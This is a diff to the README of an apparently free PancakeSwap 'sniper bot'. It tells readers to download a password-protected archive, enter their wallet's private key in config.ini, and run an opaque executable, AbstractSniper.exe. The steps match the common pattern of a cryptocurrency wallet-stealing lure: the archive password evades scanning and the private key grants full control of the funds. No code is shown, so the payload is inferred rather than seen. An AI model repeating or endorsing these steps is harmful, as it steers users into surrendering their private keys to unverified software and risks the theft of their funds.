@@ -4,19 +4,16 @@ A free sniper bot built to work with PancakeSwap: Router V2
 # How to use:
 _____________
 
-Download zip archive and extract bot to a preferred folder
-
-
-You need to open config.ini 
+1. Download 
+2. Unpack archive, password - AbstractHQ
+3. Edit the config.ini 
 
 WALLETADDRESS: Your public address.
-
 PRIVATEKEY: 0x…
-
-LIQUIDITYPOOL: BNB, You can choose any pool. 
-
+LIQUIDITYPOOL: BNB, You can choose any pool.
 TRADEMODE: true, True if you want to activate, it otherwise false
 
+4. Open AbstractSniper.exe
 
 
 How to run
